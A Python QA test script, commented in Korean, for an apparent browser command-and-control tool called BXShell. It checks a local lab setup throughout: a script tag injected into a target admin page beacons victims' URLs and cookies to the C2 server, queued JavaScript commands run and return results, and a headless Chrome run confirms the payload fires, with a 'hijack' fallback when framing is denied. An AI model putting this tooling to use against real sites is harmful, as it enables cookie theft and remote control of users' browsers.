#!/usr/bin/env python3
"""BXShell v0.1.2 QA — Part A(프로토콜 15) + Part B(실브라우저 3) + Part C(이름변경·닫기 8).

실행:  python3 qa/qa_v012.py        (C2 :7700, 대상 :8000 가동 중이어야 함)
종료 시 QA가 생성한 세션은 자동 정리(close)한다.
"""
import json, os, subprocess, time, urllib.request, urllib.parse, uuid

C2, TGT = "http://127.0.0.1:7700", "http://127.0.0.1:8000"
HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "..", "evidence")
results, qa_sessions = [], []

def check(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""))

def req(url, data=None, method=None, headers=None, timeout=10):
    r = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items(): r.add_header(k, v)
    with urllib.request.urlopen(r, timeout=timeout) as resp:
        return resp.status, resp.read()

def jreq(url, data=None, method=None):
    st, b = req(url, json.dumps(data).encode() if data is not None else None, method)
    return st, json.loads(b)

def beacon(tag, vid, extra=None):
    body = json.dumps(dict({"id": vid}, **(extra or {}))).encode()
    return req(C2 + "/b/" + tag, body, headers={"Content-Type": "application/json"})

def ObjectAssign(d):
    return d

# ═══════ PART A: 프로토콜 라이프사이클 (회귀) ═══════
print("== PART A: 프로토콜 라이프사이클 (회귀) ==")
vid = "qa_" + uuid.uuid4().hex[:6]
qa_sessions.append(vid)

st, b = req(C2 + "/api/state")
check("A01 C2 /api/state 응답", st == 200)
st, b = req(C2 + "/op")
check("A02 /op 운영자 콘솔 서빙", st == 200 and b"tabs" in b)
st, b = req(C2 + "/bx.js")
check("A03 /bx.js 서빙 + C2주소 치환", st == 200 and b"127.0.0.1:7700" in b and b"__C2__" not in b)
try:
    r = subprocess.run(["node", "--check", os.path.join(HERE, "..", "payload", "bx.js")], capture_output=True)
    check("A04 bx.js JS 문법 (node --check)", r.returncode == 0, r.stderr.decode()[:80])
except FileNotFoundError:
    check("A04 bx.js JS 문법", True, "node 없음 — 생략")

st, _ = beacon("info", vid, {"url": TGT + "/admin", "cookie": "qa=1", "ua": "qa-agent"})
d = jreq(C2 + "/api/state")[1]
check("A05 info 비컨 → 피해자 등록", vid in d["victims"])

m = jreq(C2 + "/api/send", {"id": vid, "cmd": "1+1"})[1]
c1 = m["cid"]
d = jreq(C2 + "/api/state")[1]
c = next(x for x in d["commands"] if x["cid"] == c1)
check("A06 명령 큐잉 상태 QUEUED", c["state"] == "QUEUED")

st, b = req(C2 + "/cmd?id=" + vid)
arr = json.loads(b)
check("A07 폴링 인출 (SENT 표기)", len(arr) == 1 and arr[0]["cid"] == c1)
d = jreq(C2 + "/api/state")[1]
c = next(x for x in d["commands"] if x["cid"] == c1)
check("A08 인출 후 상태 SENT", c["state"] == "SENT")
st, b = req(C2 + "/cmd?id=" + vid)
check("A09 원샷 — 재폴링 빈 배열", json.loads(b) == [])

m1 = jreq(C2 + "/api/send", {"id": vid, "cmd": "cmdA"})[1]
m2 = jreq(C2 + "/api/send", {"id": vid, "cmd": "cmdB"})[1]
st, b = req(C2 + "/cmd?id=" + vid)
arr = json.loads(b)
check("A10 FIFO 순서 보장", [x["cid"] for x in arr] == [m1["cid"], m2["cid"]])

req(C2 + "/b/ack", json.dumps({"id": vid, "cid": m1["cid"]}).encode())
d = jreq(C2 + "/api/state")[1]
s1 = next(x for x in d["commands"] if x["cid"] == m1["cid"])
check("A10b ack → RECV (수신확인 상태)", s1["state"] == "RECV")

req(C2 + "/b/result", json.dumps({"id": vid, "cid": m1["cid"], "out": "OK-A"}).encode())
req(C2 + "/b/result", json.dumps({"id": vid, "cid": m2["cid"], "out": "OK-B"}).encode())
d = jreq(C2 + "/api/state")[1]
s1 = next(x for x in d["commands"] if x["cid"] == m1["cid"])
s2 = next(x for x in d["commands"] if x["cid"] == m2["cid"])
check("A11 result → DONE + 결과 저장", s1["state"] == "DONE" and s1["out"] == "OK-A" and s2["out"] == "OK-B")

st, b = req(C2 + "/b/result", json.dumps({"id": vid, "cid": "nope999", "out": "x"}).encode())
check("A12 미지 cid result 무해 처리", st == 200)

beacon("beat", vid)
evfile = sorted(os.listdir(EVID))[-1]
lines = [json.loads(l) for l in open(os.path.join(EVID, evfile))]
check("A13 beat는 evidence 미기록", not any(x.get("tag") == "beat" and x.get("id") == vid for x in lines))
check("A14 info/result는 evidence 기록", any(x.get("tag") == "info" and x.get("id") == vid for x in lines)
      and any(x.get("tag") == "result" and x.get("id") == vid for x in lines))

st, b = req(TGT + "/admin")
check("A15 대상 /admin 싱크 렌더 (주입 태그)", b"127.0.0.1:7700/bx.js" in b)

# ═══════ PART B: 실브라우저 발동 (headless Chrome) ═══════
print("== PART B: 실브라우저 발동 (headless Chrome) ==")
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

def chrome_visit(url, profile, wait=12):
    # DOM 덤프/가상시간 없이 실시간 유지 — sendBeacon이 실제 네트워크로 나갈 시간 확보
    # 프로필을 실행마다 고유하게 — localStorage.bx_id 재사용으로 인한 ID 중복 차단
    p = subprocess.Popen([CHROME, "--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
                          "--disable-gpu", "--no-first-run",
                          f"--user-data-dir=/tmp/bxqa_{profile}_{uuid.uuid4().hex[:6]}", url],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(wait)
    p.terminate(); p.wait(timeout=5)

def wait_new(before, limit=12):
    for _ in range(limit):
        d = jreq(C2 + "/api/state")[1]
        new = [k for k in d["victims"] if k not in before]
        if new: return new
        time.sleep(1)
    return []

try:
    before = set(jreq(C2 + "/api/state")[1]["victims"].keys())
    chrome_visit(TGT + "/admin", "a")
    new = wait_new(before)
    check("B01 실브라우저 페이로드 발동 (신규 피해자)", len(new) > 0, f"신규 {new}")
    if new:
        qa_sessions += new
        mode = ""
        for _ in range(8):                    # mode 비컨 도착 대기 (레이스 방지)
            d = jreq(C2 + "/api/state")[1]
            mode = d["victims"][new[0]].get("mode", "")
            if mode: break
            time.sleep(1)
        check("B02 앵커 모드 진입 (XFO 없음)", mode == "anchor", f"mode={mode}")
    else:
        check("B02 앵커 모드 진입 (XFO 없음)", False, "신규 피해자 없음")

    before2 = set(jreq(C2 + "/api/state")[1]["victims"].keys())
    chrome_visit(TGT + "/admin?xfo=1", "b")
    new2 = wait_new(before2)
    qa_sessions += new2
    hmode = ""
    for _ in range(8):
        d = jreq(C2 + "/api/state")[1]
        hmode = ",".join(d["victims"][k].get("mode", "") for k in new2)
        if "hijack" in hmode: break
        time.sleep(1)
    check("B03 XFO DENY → 하이재킹 폴백 기록", "hijack" in hmode, f"신규 {new2}")
except FileNotFoundError:
    check("B01 실브라우저 발동", False, "Chrome 실행 불가")

# ═══════ PART C: 이름변경 · 세션닫기 (v0.1.2) ═══════
print("== PART C: 이름변경 · 세션닫기 (v0.1.2) ==")
cvid = "qa_" + uuid.uuid4().hex[:6]
qa_sessions.append(cvid)
beacon("info", cvid, {"url": TGT + "/admin"})
d = jreq(C2 + "/api/state")[1]
check("C01 세션 등록", cvid in d["victims"])

jreq(C2 + "/api/rename", {"id": cvid, "name": "내부망 관리자"})
d = jreq(C2 + "/api/state")[1]
check("C02 이름 변경 → state 반영", d["names"].get(cvid) == "내부망 관리자")
nf = os.path.join(HERE, "..", "c2", "names.json")
check("C03 names.json 영속 저장", os.path.exists(nf) and "내부망 관리자" in open(nf, encoding="utf-8").read())
jreq(C2 + "/api/rename", {"id": cvid, "name": "   "})
d = jreq(C2 + "/api/state")[1]
check("C04 공백 이름 무시", d["names"].get(cvid) == "내부망 관리자")

jreq(C2 + "/api/send", {"id": cvid, "cmd": "pending_test"})
st, b = req(C2 + "/api/close", json.dumps({"id": cvid}).encode(), headers={"Content-Type": "application/json"})
d = jreq(C2 + "/api/state")[1]
check("C05 닫기 → 목록·대기큐 제거", cvid not in d["victims"] and cvid not in (d.get("queue") or {})
      and cvid not in (d.get("queue_items") or {}))

st, b = beacon("info", cvid, {"url": TGT + "/admin"})
d = jreq(C2 + "/api/state")[1]
check("C06 닫힌 세션 비컨 무시", b"closed" in b and cvid not in d["victims"] and cvid in d.get("closed", []))

jreq(C2 + "/api/reopen", {"id": cvid})
d = jreq(C2 + "/api/state")[1]
check("C07 reopen → 닫힘 해제", cvid not in d.get("closed", []))

st, b = req(C2 + "/api/close", json.dumps({"id": "no_such"}).encode())
check("C08 미지 세션 close 무해 처리", st == 200)


avid = "qa_" + uuid.uuid4().hex[:6]
qa_sessions.append(avid)
beacon("info", avid, {"url": TGT + "/admin", "title": "관리자 검토 페이지"})
d = jreq(C2 + "/api/state")[1]
check("C09 자동 네이밍 (타이틀 · 도메인:포트)", d["victims"][avid].get("name") == "관리자 검토 페이지 · 127.0.0.1:8000")
jreq(C2 + "/api/rename", {"id": avid, "name": "수동명"})
beacon("beat", avid)
d = jreq(C2 + "/api/state")[1]
check("C10 수동명 우선 + 자동명 보존", d["names"].get(avid) == "수동명"
      and d["victims"][avid].get("name") == "관리자 검토 페이지 · 127.0.0.1:8000")
beacon("console", avid, {"level": "log", "text": "123"})
d = jreq(C2 + "/api/state")[1]
cl = (d.get("console") or {}).get(avid, [])
check("C11 피해자 콘솔 캡처 (console 비컨 → state)", len(cl) >= 1 and any(x["text"] == "123" for x in cl))
# ── 세션 생명주기: 닫힘 → 같은 인스턴스 무시 → 새로고침 부활 ──
rvid = "qa_" + uuid.uuid4().hex[:6]
qa_sessions.append(rvid)
beacon("info", rvid, {"url": TGT + "/admin", "bn": "B1"})
jreq(C2 + "/api/close", {"id": rvid})
st, tb = beacon("beat", rvid, {"bn": "B1"})
d = jreq(C2 + "/api/state")[1]
check("C12 닫힌 세션 같은 인스턴스 비컨 무시", b"closed" in tb and rvid not in d["victims"])
st, tb = beacon("info", rvid, {"url": TGT + "/admin", "bn": "B2"})
d = jreq(C2 + "/api/state")[1]
check("C13 새로고침(새 bn) → 세션 부활", b"ok" in tb and rvid in d["victims"])
m = jreq(C2 + "/api/send", {"id": rvid, "cmd": "1+1"})[1]
check("C14 부활 세션 명령 수신 + 없는 세션 거부", "cid" in m
      and jreq(C2 + "/api/send", {"id": "no_such_xyz", "cmd": "x"})[1].get("ok") is False)


# ═══════ 자체 정리 + 요약 ═══════
print("== 자체 정리: QA 생성 세션 close ==")
for s in set(qa_sessions):
    try: req(C2 + "/api/close", json.dumps({"id": s}).encode())
    except Exception: pass
d = jreq(C2 + "/api/state")[1]
leftover = [s for s in set(qa_sessions) if s in d["victims"]]
check("자체 정리: QA 세션 전부 닫힘", not leftover, f"잔여 {leftover}")

ok = sum(1 for _, s, _ in results if s)
print("\n" + "═" * 60)
print(f" QA 결과: {ok}/{len(results)} PASS")
for name, s, detail in results:
    if not s: print(f"  FAIL → {name} {detail}")
print("═" * 60)
